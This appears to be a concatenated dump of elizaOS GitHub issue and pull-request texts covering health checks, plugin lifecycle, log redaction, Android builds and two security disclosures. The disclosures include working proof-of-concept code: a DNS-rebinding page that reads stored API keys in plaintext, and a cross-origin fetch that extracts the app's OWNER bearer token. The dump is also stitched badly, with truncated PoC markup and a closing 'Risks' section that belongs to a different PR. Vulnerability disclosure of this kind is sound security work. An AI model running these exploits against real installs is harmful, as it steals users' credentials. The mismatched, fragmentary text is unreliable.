71:T191e,**Describe the bug**

`/api/status`, `/api/health` and the WebSocket status payload report `canRespond: true` on two runtimes whose first turn cannot be served, because `computeCanRespond` counts the local-inference router as a text provider.

- `computeCanRespond` (`packages/agent/src/api/health-routes.ts:468`) asks `hasTextGenerationHandler(runtime)`, which is satisfied by any registration on a text slot. The local-inference plugin registers `eliza-router` on every text slot (`plugins/plugin-local-inference/src/services/router-handler.ts`, `installRouterHandler`). The router serves nothing itself: it dispatches to the other registered handlers, and with none it throws `NoModelProviderConfiguredError` (`router-handler.ts:488-490`, "No provider registered for TEXT_LARGE. Configure a cloud provider, enable local inference, or pair a device."). A runtime whose text slots hold only the router therefore reports `canRespond: true` while every turn fails. That shape is produced in practice: with `ELIZA_DEVICE_BRIDGE_ENABLED=1` and no device attached, `ensureLocalInferenceHandler` installs the router and returns before registering any text handler (`plugins/plugin-local-inference/src/runtime/ensure-local-inference-handler.ts:1784-1797`).
- `isCloudTextModelUnavailable` (`health-routes.ts:640-644`) gates chat only when every provider registered for a missing Cloud model type is `elizaOSCloud`. On a host where the router sits beside Cloud alone, `providers` is `["eliza-router", "elizaOSCloud"]`, so a positive catalog answer that the Cloud model is missing never gates chat, although the router's only candidate is that same Cloud handler.

`readLocalTextModelReadiness` already leaves the router out of its registration filter (`health-routes.ts:500-506`, since #32953). The two checks above do not. The #32953 review recorded both as non-blocking findings; this issue is the follow-up.

**To Reproduce**

On `origin/develop` `27dec7b0c3`, Bun 1.3.14, Node 24.15.0, a test that installs the production router on a real `AgentRuntime` and compares `canRespond` with what `useModel` does:

```ts
const runtime = new AgentRuntime({ character: { name: "Router only", bio: [] } });
installRouterHandler(runtime); // production router from plugin-local-inference
await expect(
  runtime.useModel(ModelType.TEXT_LARGE, { prompt: "first turn" }),
).rejects.toBeInstanceOf(NoModelProviderConfiguredError); // passes
expect(computeCanRespond(runtime, "running", null)).toBe(false); // fails: true
```

```ts
const runtime = await initializedRuntime("Router over Cloud");
runtime.registerModel(ModelType.TEXT_LARGE, noInference, "elizaOSCloud");
installRouterHandler(runtime);
// CLOUD_MODEL_REGISTRY service reports TEXT_LARGE as model_not_available
expect(computeCanRespond(runtime, "running", null)).toBe(false); // fails: true
```

```
$ cd packages/agent && bunx vitest run test/response-readiness-router.test.ts   # develop health-routes.ts
 ❯ test/response-readiness-router.test.ts (6 tests | 2 failed)
   × does not report a router with no provider behind it as able to respond
   × gates a Cloud-only runtime behind the router when the catalog lacks the model
AssertionError: expected true to be false // Object.is equality
AssertionError: expected true to be false // Object.is equality
```

Without the router, the same Cloud-only runtime is gated correctly, which the existing `local-model-readiness-http.test.ts` pins ("preserves Cloud unknown, explicit unavailable, and fallback-provider behavior").

**Expected behavior**

- A runtime whose text slots hold nothing but the router reports `canRespond: false`, the same as a runtime with no text handler at all.
- A runtime with Cloud behind the router is gated by a positive catalog answer that the Cloud model is missing, the same as a Cloud-only runtime without the router.
- A router over any real provider (local inference, Cloud, OpenAI, Ollama, a custom provider) keeps reporting `canRespond: true`.

**Screenshots / recording of the wrong behavior (required for anything visible)**

N/A - the defect is in the readiness JSON that the composer gate reads; the test transcript above is the proof. The visible effect is a composer that goes live on a host whose first turn then fails.

**Evidence / reproduction proof**

- [x] MP4 recording or JPG screenshots of the broken behavior: N/A - no rendered surface of its own; see the transcript.
- [x] Backend logs and frontend console/network logs when relevant: the assertion output above; `useModel` rejects with `NoModelProviderConfiguredError` on the router-only runtime.
- [x] Real-LLM trajectory when the bug involves agent/action/prompt/model behavior: N/A - no model is invoked; the router rejects before any provider.
- [x] Domain artifacts when relevant: the registration table of the router-only runtime (`getModelRegistrations()` filtered to `TEXT_LARGE` gives `["eliza-router"]`).

**Additional context**

- `hasTextGenerationHandler` lives in `plugins/plugin-assistant/src/services/message/trajectory-stages.ts:385-397` and uses `runtime.getModel(type)`, which returns the router's handler. The narrowest fix keeps that helper and adds a router-aware registration check in `health-routes.ts`, which already knows the router's provider name.
- On a device-bridge host, the UI composer currently goes live while the device is still absent. After the fix it stays locked until a device or another provider registers, which matches what a turn would do.

75:T2a59,## Summary

Two locally-trusting servers started by the desktop app combine into a **DNS rebinding** bypass of the same-origin policy:

1. The **renderer server** (Electrobun main process, `Bun.serve`, `127.0.0.1:5174`) reverse-proxies `/api/*`, `/ws`, `/music-player` to the agent API it spawned on `127.0.0.1:31337`. Before forwarding, it **strips the request's `Host` header** (treated as hop-by-hop) and rewrites it to the loopback target, while passing `Origin` / `Sec-Fetch-*` through. The proxy itself does not validate where a request comes from.
2. The **agent API** treats every loopback peer as **OWNER, unconditionally** (`isTrustedLocalRequest`).

An attacker serves a page from a rebinding domain — e.g. `7f000001.<attacker-ip-hex>.rbndr.us`, which alternates A records between the attacker's IP and `127.0.0.1` (TTL 1s). Once the domain resolves to `127.0.0.1`, the attacker's page is **same-origin with the renderer server**, and its GETs flow through the proxy into the agent API: `Host` has been rewritten to loopback, a same-origin GET carries **no `Origin` header**, and `Sec-Fetch-Site` is `same-origin` — every loopback-trust condition is satisfied *legitimately*, so the request is authorized as **OWNER with zero credentials**.

Result: any website can read **all GET endpoints** of the agent API, including:

- `GET /api/secrets/inventory` — enumerates every stored secret (key / label / category / lastModified)
- `GET /api/secrets/inventory/:key` — returns the secret's **current value in plaintext** (verified: `{"ok":true,"value":"sk-…","source":"bare"}`) — e.g. LLM provider API keys
- `GET /api/secrets` — directory with isSet status + masked values (`maskValue`) for cross-checking
- `/api/agents`, `/api/plugins`, `/api/rooms`, … — all business data

## Environment

- `@elizaos/app` 2.0.3-beta.7 (commit `876317fb`), Windows 11, default local configuration
- Attacker needs any domain that can alternate A records (the free `rbndr.us` service works) and an HTTP server on the **same port as the victim's renderer** (default 5174)

## Root cause

**Renderer proxy strips/rewrites Host** — `packages/app/platforms/electrobun/src/renderer-api-proxy.ts:74-92`:

```ts
const HOP_BY_HOP_HEADERS = new Set([
  "connection",
  "keep-alive",
  "host",   // ← the request's Host is dropped, then rewritten to the loopback proxy target
  ...
]);
```

**Agent API: loopback peer = unconditional OWNER** — `packages/agent/src/api/server-helpers-auth.ts:348-364`:

```ts
if (isTrustedLocalRequest(req)) return true;   // loopback peer → OWNER, no credentials
```

`isTrustedLocalRequest` (`packages/core/src/security/loopback-trust.ts:374-416`) bases the decision entirely on request properties: loopback TCP peer, no proxy-client-IP headers, loopback `Host`, `Sec-Fetch-Site` ∈ {missing, same-origin, none}, `Origin` absent-or-trusted (`isTrustedLocalOrigin`, :347-360, passes when `Origin` is missing). This correctly blocks **direct** cross-site requests to `:31337` (`Sec-Fetch-Site: cross-site` → 403) — but after a rebind, the browser's request *is* same-origin, so it passes.

The secrets endpoints are gated on OWNER only — e.g. `packages/app/src/api/secrets-inventory-routes.ts:124` (`ensureRouteMinRole(..., "OWNER")`), `packages/agent/src/api/plugin-management-routes.ts:280-291` — and a rebound request **is** OWNER. (Additionally, `packages/agent/src/api/media-runtime.ts:92-115` marks media routes `public: true`.)

Attack chain:

```
attacker domain (A record → attacker) serves the malicious page
  → TTL expires, domain resolves to 127.0.0.1 (rbndr.us alternates both IPs, TTL 1s)
  → page is now same-origin with the renderer (127.0.0.1:5174)
  → same-origin GET fetch("/api/secrets/inventory/<key>")
  → renderer proxy strips Host, forwards → agent API (127.0.0.1:31337)
  → loopback peer + rewritten Host + GET without Origin → trusted → OWNER
  → 200 {"ok":true,"value":"sk-…"} — plaintext API key, readable same-origin
```

## Steps to reproduce

> DNS rebinding requires the attacker page to be served on the **same port** the victim's renderer listens on (default 5174, from any non-loopback IP — a second machine, or another NIC/LAN IP on the same machine).

1. **Attacker side:** save the PoC below as `poc.html` and serve it on port 5174 (`python -m http.server 5174`).
2. Build the rebinding domain: `7f000001.<attacker-ip-hex>.rbndr.us` — e.g. attacker `192.168.1.10` → hex `c0a8010a` → `7f000001.c0a8010a.rbndr.us` (`7f000001` = 127.0.0.1).
3. **Victim side:** start the desktop app (default config), browse to `http://7f000001.c0a8010a.rbndr.us:5174/poc.html`, click "Start".
4. The page polls a relative GET every 900 ms (≤90 tries). While DNS points at the attacker it just gets the PoC page back (or 404); once it flips to `127.0.0.1` you get `REBIND HIT`, and the page reads `/api/secrets/inventory`, `/api/secrets/inventory/<key>` (plaintext), `/api/agents`, `/api/plugins`, `/api/rooms` — all HTTP 200, bodies fully readable (same-origin).

Minimal PoC (any page on the rebinding domain, after the DNS flip):

```js
const keys = await (await fetch("/api/secrets/inventory", { cache: "no-store" })).json(); // enumerate stored secrets
const r = await fetch("/api/secrets/inventory/ANTHROPIC_API_KEY", { cache: "no-store" }); // same-origin GET, no Origin header
const data = await r.json(); // {"ok":true,"value":"sk-…","source":"bare"} — plaintext API key
```

Self-contained PoC page:

```html

  const d = document.createElement('div');

  d.style.color = c || '#c9d1d9';
  document.getElementById('log').appendChild(d);

let scanning = false;
async function rebind() {
  if (scanning) return;
  if (location.protocol === 'file:') { log('[x] Open this page over http:// via the rbndr domain (file:// cannot rebind)', '#ff7b72'); return; }
  if (/^(127\.|localhost|\[::1\])/.test(location.hostname))

  const target = document.getElementById('target').value;
  scanning = true;
  log('[*] Page origin: ' + location.origin + ' (the domain alternates attacker-IP <-> 127.0.0.1, TTL 1s)', '#8b949e');
  let hit = false;
  for (let i = 1; i <= 90 && !hit; i++) {
    try {
      const r = await fetch(target, { cache: 'no-store', referrerPolicy: 'no-referrer' });
      const body = await r.text();
      if (r.status === 200 && body.length > 0 && !/attacker rebind page/.test(body)) {
        // response is no longer this PoC itself (the attacker side serves this page) -> rebound to 127.0.0.1
        hit = true;
        log('[*] REBIND HIT @ try ' + i + ': ' + target + ' -> HTTP ' + r.status + ' (now same-origin with 127.0.0.1:' + location.port + ')', '#ff7b72');
        log('[+] First 500 bytes of the response:', '#3fb950');
        log('    ' + body.slice(0, 500), '#8b949e');
        if (target.indexOf('/api/secrets/inventory/') === 0 && /"value"\s*:/.test(body))
          log('[*] Plaintext API key read without authorization — ' + body, '#ff7b72');
        log('[*] Impact: a page on the attacker domain reads agent API GET data as OWNER, with no credentials', '#ff7b72');
      } else {
        log('[-] try ' + i + ': HTTP ' + r.status + ' (DNS currently on the attacker side / got the PoC page itself)', '#8b949e');
      }
    } catch (e) {
      log('[-] try ' + i + ': network error (DNS currently on the attacker side, or connection refused)', '#8b949e');
    }
    await new Promise(s => setTimeout(s, 900));
  }
  if (!hit) log('[x] No hit in 90 tries. Check: do the attacker server and the victim renderer use the same port (both 5174)? Is the rbndr domain correct?', '#ff7b72');
  scanning = false;

</script>
</body>
</html>
```

## Negative control (what already works)

- From an ordinary website: `fetch("http://127.0.0.1:5174/api/...")` → the browser attaches `Sec-Fetch-Site: cross-site` → the agent API returns **403**.
- Direct request to `:31337` with a stolen Bearer token → **403**.
- Only the rebinding path succeeds without credentials — the agent API does defend against direct cross-site access; the gap is the **renderer proxy chain**.

## Impact (and honest scope)

- Through this path a browser obtains **read-only OWNER access**: all GET endpoints, including stored secrets in plaintext.
- **Writes are blocked**: POST/PUT/DELETE from the browser carry `Origin` → 403. No write/RCE from the browser via this issue alone.
- Plaintext reads only cover secrets the victim has actually stored.
- Requires an attacker-controlled domain (free `rbndr.us` suffices) and the same port as the renderer (default 5174; if the renderer increments, the attacker port follows).
- The rebind usually lands within ~10 s of polling (90 × 900 ms window).
- Chrome LNA, if enforced, would block page→127.0.0.1 requests; default Chrome/Firefox today are affected.

## Suggested fix

1. **Validate `Host` in the renderer proxy** (`renderer-api-proxy.ts`): only forward requests whose `Host` is the expected loopback host (`127.0.0.1:5174` / `localhost:5174`); reject everything else. This is the standard DNS-rebinding mitigation — during a rebind attack the Host is the attacker's domain.
2. **Add a shared secret between the renderer proxy and the agent API**, so "can connect to :5174" no longer equals OWNER; loopback trust should not rest on forgeable/satisfiable headers alone.
3. **Never return secret plaintext from `/api/secrets/inventory/:key`** — return masked values or decrypt on explicit request, so even a bypassed OWNER read yields no key material.
4. Defense in depth: reject non-loopback `Host`/`Origin` outright in the loopback-trust check.76:T19a3,## Summary

The ElizaOS desktop app starts a local **renderer HTTP server** (Electrobun main process, `Bun.serve`, default `127.0.0.1:5174`, incrementing if taken). Two flaws on this server combine:

1. **Every static response is served with `Access-Control-Allow-Origin: *`** — JavaScript on any website can read the response bodies cross-origin.
2. **The built-in index page embeds the app's boot config in plaintext**, including the agent API's **OWNER-level Bearer token (`apiToken`)** and its base URL (`apiBase`).

So if the victim simply opens any attacker-controlled web page while the desktop app is running, that page performs one plain cross-origin GET (a simple request, **no preflight**) to `http://127.0.0.1:5174/`, reads the full HTML, and extracts the OWNER token with a regex. Zero interaction, no dialogs, completely silent — the app's highest-privilege credential is handed to an arbitrary website.

## Environment

- `@elizaos/app` 2.0.3-beta.7 (commit `876317fb`), Windows 11, default local configuration (no special settings)

## Root cause

`packages/app/platforms/electrobun/src/index.ts` — static-file handling of the renderer server:

```ts
// index.ts:915-933 — HTML branch
if (mimeExt === ".html" || filePath.endsWith("index.html")) {
    const html = apiBaseOwner.injectIntoHtml(content.toString("utf8"));  // :925 — injects apiToken + apiBase into the page
    return new Response(html, {
        headers: {
            "Content-Type": "text/html; charset=utf-8",
            "Access-Control-Allow-Origin": "*",                           // :929 — any origin may read this
            "Cache-Control": "public, max-age=0, must-revalidate",
        },
    });
}
```

```ts
// index.ts:934-937 — all other static assets
const headers: Record<string, string> = {
    "Content-Type": getRendererAssetContentType(mimeExt),
    "Access-Control-Allow-Origin": "*",                                   // :936
    ...
};
```

Either flaw alone would be harmless (no token embedded → nothing to steal; no `ACAO: *` → body unreadable cross-origin). Together, the OWNER credential leaves the victim's machine into the attacker's page context.

## Steps to reproduce

1. Start the desktop app (default config). The renderer listens on `127.0.0.1:5174`.
2. Open any other web page (any http/https origin — even `file://` works, which is convenient for verification) and run this from the browser console:

```js

const html = await r.text();
console.log(r.headers.get("access-control-allow-origin")); // "*"  (cross-origin read allowed)
console.log(html.match(/apiToken:"([0-9a-fA-F]+)"/)[1]);   // the OWNER-level Bearer token
console.log(html.match(/apiBase:"([^"]+)"/)[1]);           // e.g. http://127.0.0.1:31337
```

3. The console prints the OWNER token.

Self-contained attacker page (save as `.html`, open in a browser on the victim machine, click the button):

```html

  d.style.color = c || '#c9d1d9';
  document.getElementById('log').appendChild(d);

async function steal() {
  const port = document.getElementById('port').value.trim() || '5174';
  log('[*] Target: http://127.0.0.1:' + port + '/  (plain GET, no preflight, any origin may send it)', '#8b949e');
  try {
    const r = await fetch('http://127.0.0.1:' + port + '/', { cache: 'no-store' });
    log('[+] HTTP ' + r.status, '#3fb950');
    const acao = r.headers.get('access-control-allow-origin');
    log(acao === null ? '[-] No ACAO header (this port may not be the renderer)'
                      : '[+] Access-Control-Allow-Origin: ' + acao, acao === '*' ? '#ffa657' : '#d29922');
    const html = await r.text();
    log('[+] Cross-origin body read succeeded, ' + html.length + ' bytes', '#3fb950');
    const tk = html.match(/apiToken:"([0-9a-fA-F]+)"/);
    const ab = html.match(/apiBase:"([^"]+)"/);
    if (tk) log('[+] Stolen OWNER Bearer token: ' + tk[1], '#ffa657');
    if (ab) log('[+] apiBase: ' + ab[1], '#ffa657');
    if (tk && ab) log('[*] Impact: a malicious website has obtained the agent API OWNER credential with zero interaction', '#ff7b72');
  } catch (e) {
    log('[-] Request failed: ' + e.message, '#ff7b72');
  }
}
</script>
</body>
</html>
```

## Expected / actual

- **Expected:** an external origin cannot read the local renderer's responses, and the OWNER token is never exposed to web content.
- **Actual:** `ACAO: *` lets any origin read the index HTML, which contains the OWNER Bearer token in plaintext.

## Impact (and honest scope)

- The agent API's **OWNER credential itself is exfiltrated** to any website the user visits — zero interaction beyond opening a page.
- Directly replaying **write** requests (POST/PUT) from the browser with the stolen token is rejected with 403: the agent API's loopback-trust check refuses requests carrying an untrusted `Origin` header (`packages/core/src/security/loopback-trust.ts:347-416`). The damage here is the credential leaving the machine, plus chaining with any local process or other issues — a local process holding this token can call the full API as OWNER.
- Chrome's Local Network Access (LNA), if enforced, would block page→127.0.0.1 requests; default Chrome/Firefox today are affected.
- Not applicable in external/cloud connection mode (no `apiToken` embedded there).

## Suggested fix

1. **Remove `Access-Control-Allow-Origin: *`** from static responses (`index.ts:929`, `index.ts:936`). The desktop UI does not need to be readable by arbitrary web origins.
2. **Don't embed the long-lived OWNER token in the HTML** (`injectIntoHtml`): deliver it via one-time runtime IPC, or use short-lived per-session credentials bound to the app's own processes.
3. If the UI must be served over HTTP, put an **Origin allowlist** on the renderer server (app protocol / loopback same-origin only).77:Tee6,Agent clients need durable, owner-bound workflows and reviewed device operations that survive interruptions, reconnects and process restarts. This change adds generic runtime contracts and persistence for those flows, including managed Cloud Google delegation, hosted results and selected Maps reads.

- Durable workflow authoring, validation, approval receipts, lifecycle changes and hosted delivery retain explicit approval and owner boundaries. Generic approval presentation is authoritative; legacy metadata remains a compatibility reader with downgrade rejection.
- Device actions bind proposals, approval, claim and immutable receipts to authenticated owner, agent and device enrollment. Selected Maps reads require negotiated capability and matching target identity; replay retrieves the bounded historical result without a new device read.
- Managed Cloud owner configuration and Google delegation provide identity and Gmail/Calendar access boundaries with server-side credentials and scope checks.
- Action discovery retains umbrella actions when a resource-specific alias matches, preserving role and context eligibility.
- Workflow mutation replies carry canonical receipts from the actual committed definition. Cancellation provenance is captured under the row lock, with per-service workflow control serialization. Submission, cancellation requests and pending device approvals cannot serve as proof that the requested operation completed. Pending workflow widgets retain their callback delivery.

7f:T2528,# Relates to

Resolves #33187 (focused issue requested by the reviews on this PR). Repairs this PR per the three reproduced reviews: the guard validated only the `bun` found on `PATH` — the postinstall child — while the install itself may be performed by a different Bun exposed to lifecycle scripts as `npm_execpath`. An off-pin installer could pass behind a pinned PATH bun, and a pinned installer could be rejected because of an off-pin PATH bun ([#33047 review, two-binary reproduction](https://github.com/elizaOS/eliza/pull/33047#issuecomment-*)).

# Change

`packages/scripts/check-bun-runtime-pin.ts` (first root-postinstall link, wired in `package.json`) now enforces one contract on both Bun processes an install has:

- **Installer** (the binary in `npm_execpath` that resolved dependencies and wrote `bun.lock`): identified by executing it with a Bun-only eval probe; a missing `npm_execpath`, an unexecutable path, or a non-Bun answer fails the install closed.
- **Postinstall runtime** (the `bun` resolved from `PATH` that runs the patch/build chain): checked via `process.versions.bun` as before, still enforced — its `Bun.build` output differs across versions.
- The pin is an exact release identity from `.github/ci-bun-version.json`. The previous numeric-triple comparison was dead code (byte-equal text implies equal triples, so exact text equality alone decided — the surviving review mutant proved it), and its "string comparison would admit 1.4.10" rationale described a comparison the code never performed. The decision is now exact text equality on a parsed concrete release, which rejects `1.4.10`, `1.4.20`, `1.4.2-rc.1`, and `1.4.2+d1632b2` against a `1.4.2` pin.
- **Claims match behavior**: the failure output states that the guard fires *after* dependency resolution, that `bun.lock` may have been rewritten (`git checkout -- bun.lock` restores it), and leads with a platform-neutral remediation (official installer with `bun-v<pin>`; Windows release download); `bootstrap-linux-dev.sh` is labeled Linux-only.
- `--no-installer-context` is the explicit manual mode: it verifies only the running Bun and its pass output discloses that no installer was verified. Install-context runs without `npm_execpath` fail closed.

Material risk: developers who legitimately install with a non-pin Bun (or npm/pnpm/yarn, which never satisfy a Bun pin) now get a failed install with the restore and remediation steps instead of a possibly-mis-built tree — that refusal is the point of the guard, and `--ignore-scripts` remains the documented opt-out.

80:T1107,Fixes #33046
Fixes #33049

# Summary

The core log-redaction walker confused repeated references with cycles and attached an own `Symbol.toPrimitive` hook to every ordinary clone. The first behavior discarded legitimate repeated data as `[Circular]`; the second made Bun print a coercion function at every object nesting level.

This PR now owns both adjacent fixes so they can be reviewed and landed as one coherent walker change.

```ts
const owner = { id: "u1", name: "Ada", apiKey: "sk-live-fixture" };
logger.info({ requester: owner, assignee: owner }, "probe-shared-reference");
logger.info("probe-console-symbol", { owner: { id: "u1" } });
```

Before:

```text
requester={"id":"u1","name":"Ada","apiKey":"[REDACTED]"}, assignee=[Circular]
{ [Symbol(Symbol.toPrimitive)]: [Function: value], owner: { ... } }
```

After:

```text
requester={"id":"u1","name":"Ada","apiKey":"[REDACTED]"}, assignee={"id":"u1","name":"Ada","apiKey":"[REDACTED]"}
{ owner: { id: "u1" } }
```

# Change

- Track only the current ancestor path, so genuine self, mutual, array, Map, and Error-cause cycles remain `[Circular]` while non-cyclic shared references render at each position.
- Bound repeated-subtree cloning with a private 10,000-unit work budget. A repeated value renders completely or becomes one `[Shared]` marker; refused repeats are memoized so adversarial graphs and changing Proxy key lists cannot force repeated enumeration.
- Charge repeated keys, elements, entries, and long redacted text before work is performed, including skipped credential/function fields and RegExp sources.
- Add `Symbol.toPrimitive` only when an ordinary clone owns a `toString` field that would otherwise break coercion. Map/Set clones no longer receive it; Error clones retain their existing protection.
- Preserve the public `redactLogValue(value, seen, depth)` signature.

The Android vendor tree targets Android 15 (Pixel 9a, `android-15.0.0_r31`) and Android 17 (Cuttlefish, Pixel 11 Pro). It has no image for third-party Treble devices, such as MediaTek tablets that ship Android 13–16 vendor partitions.

The shared vendor SELinux policy also names `platform_app_36`. That type exists only in Android 17 public policy (`system/sepolicy` `public/platform_app.te` at `android-17.0.0_r1`; absent at `android-15.0.0_r36` and `android-16.0.0_r4`). So the `userdebug` vendor policy for the android-15 Pixel 9a profile cannot compile.

This was extracted from the senior-care product's explicit patch overlay (eliza-research/senior-care `patches/eliza/os-gsi-product.patch`) and extended to Android 15, 16 and 17.

# Change

- **New products:** `eliza_gsi_arm64` and `eliza_gsi_x86_64` are system-only GSI products.
  - Each inherits `aosp_<arch>.mk`, then `gsi_release.mk`, then the shared Eliza layer. AOSP release tags ship no `gsi_<arch>.mk`, and `aosp_<arch>.mk` only applies `gsi_release.mk` when `TARGET_PRODUCT` is exactly `aosp_<arch>`. This was checked at all three tags.
  - They set `ELIZA_GSI := true`, so policy goes to `SYSTEM_EXT_PRIVATE_SEPOLICY_DIRS`. A GSI never ships vendor policy.
- **New lock profiles in `aosp.lock.json`:**

  | Profile | Tag | Release config |
  | --- | --- | --- |
  | `gsi-android15` | `android-15.0.0_r36` | `bp1a` |
  | `gsi-android16` | `android-16.0.0_r4` | `bp4a` |
  | `gsi-android17` | `android-17.0.0_r1` | `cp2a` |

  Each profile pins the manifest and `build/make` tag objects and commits from `git ls-remote`. The release configs match each tag's build ID, the lunch choices are listed, and `make build` still selects only Cuttlefish.
- **Version-aware SELinux policy:** `eliza_common.mk` derives `ELIZA_SEPOLICY_API37` from `PLATFORM_SDK_VERSION`.
  - `version_util.mk` sets that value from `RELEASE_PLATFORM_SDK_VERSION` before product config. The include order and values (36 at bp4a, 37 at cp2a) were checked on googlesource.
  - The Android 17-only `platform_app_36` rules moved to `sepolicy/api37/` (vendor) and `sepolicy/system_ext_api37/` (GSI). These directories are selected only at SDK 37 or later.
  - An unset SDK version stops the build with an error.
  - The shared vendor policy gains the `userdebug_or_eng` `platform_app` `link` rule that Android 17 already had for `platform_app_36`. This brings Android 15 and 16 to parity.
- **Hardware target:** a blocked `generic-mediatek-gsi` target, never installer- or lab-eligible, with explicit blocked reasons.

84:T252a,# Relates to

Develop merge gate is red on the current head (3f38e54495ba5518f84bcf9cc1e84e0dc3d60bbf, "Develop Full" run 36867449005):

- `canonical / Plugin Tests (3/4)` fails: `plugins/plugin-personal-assistant/test/work-thread-native-schema.test.ts` — `validateToolArgs(WORK_THREAD, restored.arguments).valid` is `false` for a strict-mode native tool call whose omitted optionals arrive as explicit `null`s ("Argument 'operations[0].workThreadId' expected string, got null").
- `canonical / All Tests Passed` (merge gate) fails as a result.

The same failure reproduces on the live path, not just in CI: any strict (non-Cerebras) OpenAI-provider native tool call that omits an optional argument is now rejected before handler execution.

Root cause: plugin-openai's strict-tool encoding forces every schema property into wire `required` (`sanitizeJsonSchema`, the all-properties-required rule for non-Cerebras strict providers). Strict providers therefore carry every key, and the model's only honest "no value" there is an explicit `null`. Core PR #32991 (merged 2026-10-01) deliberately changed `validateSchema`/`validateObject` to preserve declared nulls instead of treating them as absent — correct for nullable action arguments, but the strict-wire null artifact now reaches the validator and rejects the whole call. The restoration step inverts the encoding's other artifact (`__eliza_record_entries`) but never inverted this one.

# Change

`plugins/plugin-openai/models/text.ts`:

- While force-requiring properties in `sanitizeJsonSchema` (tool path only — `transforms` is passed exclusively by the native-tool path; response schemas are untouched), record the forced-optional keys on the tool's `RecordArgTransform` as `omittedKeys`.
- During tool-call restoration, drop explicit `null` values at exactly those keys — the lossless inverse of the forced-required wire encoding, mirroring the existing `entriesKey` record restore. Keys whose schema declares null the way core admits it (`type: "null"`, or an `anyOf`/`oneOf` branch that admits null — the #32991 contract) keep their declared meaning and are never stripped.
- `RecordArgTransform` is now a discriminated union (record restore vs omitted-null drop), so a transform with neither variant field is unrepresentable and restore can never silently no-op on malformed state; the wire schema bytes are unchanged, preserving the pinned openai strict-tool wire contract (`qwen-response-schema.wire.test.ts`).

# Review repair (second head `4fb7f1e867e0b63dcba8664ba8991865b5f933a8`)

Reviewers @mtcow and @ss251 identified on the first head that `schemaAdmitsNull` missed the null spelling core actually admits:

- **anyOf/oneOf null branches preserved.** `schemaAdmitsNull` now mirrors core `validateSchema` admission exactly: `type: "null"` and any `anyOf`/`oneOf` branch that admits null are preserved (recursively), so a call like core's own `nullable-schema.integration.test.ts` shape (`recurrence: { anyOf: [{ type: "string", enum: [...] }, { type: "null" }] }`) no longer loses its explicit `null` on the OpenAI strict path.
- **Provider `nullable` and `type` arrays now strip as artifacts.** Core never reads the `nullable` keyword, and a `type` array reaches core's unsupported-type error, so a null at those nodes is rejected at runtime — it is a strict-wire artifact, not a declared value, and stripping it makes the call validate (the same artifact treatment as plain optionals). The predicate deliberately over-preserves when uncertain: a wrongly preserved null fails validation visibly; a wrongly stripped one silently deletes a declared value.
- **Same-path restore order pinned.** An open-map root records both an `omittedKeys` pass and an `entriesKey` restore at `$`; the stable sort keeps push order (omitted nulls drop first, entries fold in second). New test proves an entry whose value is a legitimate `null` survives even when its key matches a stripped declared key.

87:T2280,# Relates to

`installRuntimePluginLifecycle` wraps the runtime's `register*` methods so that each component a plugin contributes is recorded in `PluginOwnership`. That record is what lets `unloadPlugin` / `reloadPlugin` remove exactly that plugin's components. The wrapping covered actions, providers, evaluators, events, models, services, send handlers and the adapter. It did not cover `chatPreHandlers`, `responseHandlerEvaluators` or `responseHandlerFieldEvaluators`. Those three survived `unloadPlugin`, and on a later `reloadPlugin` the stale registration still held the slot. The registry keys pre-handlers by id, and the evaluator registers skip duplicates by name, so the fresh instances could not be installed.

# Change

- `PluginOwnership` gains `chatPreHandlerIds`, `responseHandlerEvaluatorNames` and `responseHandlerFieldEvaluatorNames`. The lifecycle wrappers fill them, `removeOwnedComponents` unregisters them, and the ownership-persist guard counts them, so a plugin that contributes only these handlers is still tracked.
- Chat pre-handlers: the registry upserts by id. Across plugin boundaries that would let a second plugin displace the first plugin's handler, and teardown cannot restore it. Plugin registration of an already-registered id is therefore first-wins with a warning, the same policy actions, providers and evaluators use (#12658). Direct registration keeps the upsert, and a plugin may re-register an id it already owns. (Review follow-up c8ccee25, see below.)
- Response-handler (field) evaluators already skip a duplicate name, so the before/after length check records ownership exactly when the call installed the evaluator.
- Test only (09c8bacb): `re-registering after unload installs fresh handler instances` now asserts that the live pre-handler and both evaluators are the objects from the second `buildPlugin()`, not only that each name appears once. Found by @Prabhat1308 in review: the count check also passed without the teardown fix.
- Risk: a plugin that relied on replacing another plugin's chat pre-handler by reusing its id now keeps the incumbent and logs a warning. No plugin in this repository registers `chatPreHandlers`.

88:T133b,# Relates to

The local agent keeps web-chat conversations in `state.conversations`. `createConversation`, `ensureOwnerConversation`, `importConversation` and the dev seed call `evictOldestConversation(state.conversations, 500)`, which drops the oldest entry from that map once it holds more than 500. The room and its messages stay in the database, and the UI keeps listing the conversation in its sidebar (`useDataLoaders.ts` already expects "the server LRU may evict a conversation").

Every route resolves a conversation through `getConversationWithRestore`, which only waits for the boot restore and then reads the map. After an eviction:

- `GET /api/conversations/:id/messages` returns 404 "Conversation not found" for a chat whose messages still exist. Send, truncate and patch fail the same way.
- `DELETE /api/conversations/:id` sees no conversation, skips the message and room deletion, writes only a tombstone and returns `{ ok: true }`. The user believes the chat is gone, but its messages and room stay stored.

# Change

On a registry miss, `getConversationWithRestore` now calls a new `restoreConversationFromDb(runtime, state, convId)`. It loads the conversation's deterministic web-chat room (`stringToUuid("web-conv-" + id)`), checks that the room belongs to this agent's web-chat world and channel, skips tombstoned ids, and rebuilds the `ConversationMeta` with the same reconstruction the boot restore uses (factored into `conversationMetaFromRoom`). Reads and deletes then follow their normal paths. The 500-entry soft cap is unchanged.

# Testing

New `packages/agent/test/conversation-evicted-restore.test.ts` runs `handleConversationRoutes` on a real migrated PGlite database. It creates a conversation with one stored message, fills the registry with newer entries so the real eviction removes it, and then:

- expects `GET .../messages` to return 200 with the stored message;
- expects `DELETE` to leave 0 message rows and no room.

On develop it fails with `expected 404 to be 200`. With this change it passes. The agent tests that drive the conversation routes (`chat-ingress-persistence`, `scheduled-routine-no-conversation-delivery`, `saved-reminder-presentation` and the new test) pass 9/9 on the pinned Node 24.15.0. `biome check` on the changed files is clean (the 3 existing warnings in `conversation-routes.ts` are untouched), and `tsc --noEmit` reports nothing for them.

# Risks

**Low.** The change adds a new optional field to an internal transform record and a strictly-scoped null-drop during tool-call argument restoration in `plugins/plugin-openai`:

- Only the non-Cerebras strict-tool path (`!preserveOptional && !preserveStructure`) registers the new null-strip transforms; Cerebras (`preserveOptional`) and response-schema (`preserveStructure`) behavior is byte-identical (guarded by the existing `cerebras-native-tools-walk-bound.shape.test.ts` exact-transform assertions, all passing).
